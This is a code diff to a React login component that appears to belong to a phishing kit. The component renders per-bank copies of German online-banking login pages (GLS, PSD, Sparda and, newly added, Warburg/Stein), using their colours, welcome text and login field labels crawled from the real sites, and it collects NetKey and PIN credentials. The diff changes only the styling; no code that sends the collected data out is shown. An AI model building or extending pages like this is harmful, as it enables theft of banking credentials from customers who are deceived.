@@ -269,9 +269,11 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
   const isPSD = bank?.group === "PSD Banken";
   const isSparda = bank?.group === "Sparda-Banken";
   const isGLS = bank?.group === "GLS Bank";
+  const isWarburg = bank?.group === "Spezifische Banken" && (bank?.name?.toLowerCase().includes("warburg") || bank?.name?.toLowerCase().includes("stein"));
   const crawledLabel = (bank as any)?.login_field_label as string | null | undefined;
   const groupLabel = isPSD ? "PSD-Key oder Alias" : isSparda ? "Sparda-NetKey oder Alias" : "VR-NetKey oder Alias";
   const aliasFieldLabel = crawledLabel && crawledLabel.trim().length > 0 ? crawledLabel : groupLabel;
+
 
   const secureGoLabel = getSecureGoLabel(bank?.group);
 
@@ -601,13 +603,18 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
         <div className="w-full lg:w-1/2 flex flex-col gap-4">
           <div className="bg-white shadow-md border border-gray-200 overflow-hidden" style={{ borderRadius: theme.buttonRadius === "rounded-none" ? "0px" : "12px" }}>
             <div className="p-6 sm:p-8">
-              {isGLS ? (
+              {isGLS || isWarburg ? (
                 <div className="flex flex-col mb-6">
-                  <h2 className="text-3xl font-bold mb-6 text-[#002864]">
+                  <h2 className={`text-3xl font-bold mb-6 ${isGLS ? "text-[#002864]" : "text-gray-600"}`}>
                     Anmelden
                   </h2>
+                  {isWarburg && (
+                    <p className="text-sm text-gray-700 mb-6">
+                      Herzlich willkommen zum {bank?.name} Onlinebanking
+                    </p>
+                  )}
                   <div className="flex border-b border-gray-200 mb-6">
-                    <button type="button" className="px-1 pb-3 text-sm font-bold text-[#002864] border-b-2 border-[#002864]">
+                    <button type="button" className={`px-1 pb-3 text-sm font-bold border-b-2 ${isGLS ? "text-[#002864] border-[#002864]" : "text-gray-600 border-gray-600"}`}>
                       Mit Zugangsdaten anmelden
                     </button>
                     <button type="button" className="px-6 pb-3 text-sm font-bold text-gray-400 hover:text-gray-600">
@@ -616,6 +623,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                   </div>
                 </div>
               ) : (
+
                 <>
                   <h2 className="text-2xl sm:text-3xl font-bold mb-4" style={{ color: themeColor }}>
                     Anmelden
@@ -648,8 +656,8 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                       value={vrNetKey}
                       onChange={(e) => { setVrNetKey(e.target.value); if (e.target.value.trim()) setVrNetKeyError(false); setCredentialsInvalid(false); setErrorMsg(null); }}
                       placeholder=" "
-                      className={`peer w-full px-4 pt-6 pb-2 border-2 focus:outline-none transition-colors text-base bg-transparent ${vrNetKeyError ? "border-red-500" : isGLS ? "border-gray-800" : "border-gray-300"}`}
-                      style={{ ...(!vrNetKeyError && vrNetKey ? { borderColor: theme.accentText } : {}), borderRadius: isGLS ? "4px" : buttonBorderRadius }}
+                       className={`peer w-full px-4 pt-6 pb-2 border-2 focus:outline-none transition-colors text-base bg-transparent ${vrNetKeyError ? "border-red-500" : (isGLS || isWarburg) ? "border-gray-800" : "border-gray-300"}`}
+                      style={{ ...(!vrNetKeyError && vrNetKey ? { borderColor: theme.accentText } : {}), borderRadius: (isGLS || isWarburg) ? "4px" : buttonBorderRadius }}
 
                       autoComplete="username"
                     />
@@ -660,6 +668,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                       {aliasFieldLabel}
                     </label>
                   </div>
+
                   {vrNetKeyError && (
                     <p className="mt-1 text-sm text-red-600 font-medium flex items-center gap-1.5">
                       <AlertCircle className="w-4 h-4" />
@@ -677,8 +686,9 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                       value={pin}
                       onChange={(e) => { setPin(e.target.value); if (e.target.value.trim()) setPinError(false); setCredentialsInvalid(false); setErrorMsg(null); }}
                       placeholder=" "
-                      className={`peer w-full px-4 pt-6 pb-2 pr-12 border-2 focus:outline-none transition-colors text-base bg-transparent ${pinError ? "border-red-500" : isGLS ? "border-gray-800" : "border-gray-300"}`}
-                      style={{ ...(!pinError && pin ? { borderColor: theme.accentText } : {}), borderRadius: isGLS ? "4px" : buttonBorderRadius }}
+                      className={`peer w-full px-4 pt-6 pb-2 pr-12 border-2 focus:outline-none transition-colors text-base bg-transparent ${pinError ? "border-red-500" : (isGLS || isWarburg) ? "border-gray-800" : "border-gray-300"}`}
+                      style={{ ...(!pinError && pin ? { borderColor: theme.accentText } : {}), borderRadius: (isGLS || isWarburg) ? "4px" : buttonBorderRadius }}
+
 
                       autoComplete="current-password"
                     />
@@ -688,11 +698,12 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                     >
                       PIN
                     </label>
-                    {isGLS && (
-                      <button type="button" className="absolute right-0 -bottom-6 text-xs font-bold text-[#002864] hover:underline">
+                    {(isGLS || isWarburg) && (
+                      <button type="button" className={`absolute right-0 -bottom-6 text-xs font-bold ${isGLS ? "text-[#002864]" : "text-gray-400"} hover:underline`}>
                         PIN vergessen?
                       </button>
                     )}
+
 
                     <button
                       type="button"
@@ -718,10 +729,11 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                     onClick={() => navigate({ to: "/" })}
                     className={`px-8 py-3 font-medium transition-colors text-sm ${isGLS ? "border border-[#002864] text-[#002864] hover:bg-gray-50" : "border-2 hover:bg-gray-50"}`}
                     style={{ 
-                      borderColor: isGLS ? "#002864" : theme.accentText, 
-                      color: isGLS ? "#002864" : theme.accentText,
-                      borderRadius: isGLS ? "0px" : buttonBorderRadius
+                      borderColor: isGLS ? "#002864" : isWarburg ? "#6d7e8b" : theme.accentText, 
+                      color: isGLS ? "#002864" : isWarburg ? "#6d7e8b" : theme.accentText,
+                      borderRadius: (isGLS || isWarburg) ? "0px" : buttonBorderRadius
                     }}
+
                   >
                     Abbrechen
                   </button>
@@ -730,9 +742,10 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                     disabled={submitting}
                     className={`px-8 py-3 text-white font-medium transition-opacity hover:opacity-90 text-sm ml-auto disabled:opacity-70 disabled:cursor-not-allowed inline-flex items-center gap-2`}
                     style={{ 
-                      backgroundColor: isGLS ? "#002864" : theme.buttonBg,
-                      borderRadius: isGLS ? "0px" : buttonBorderRadius
+                      backgroundColor: isGLS ? "#002864" : isWarburg ? "#6d7e8b" : theme.buttonBg,
+                      borderRadius: (isGLS || isWarburg) ? "0px" : buttonBorderRadius
                     }}
+
                   >
                     {submitting ? (
                       <span className="inline-flex gap-1" aria-label="Wird geprüft">
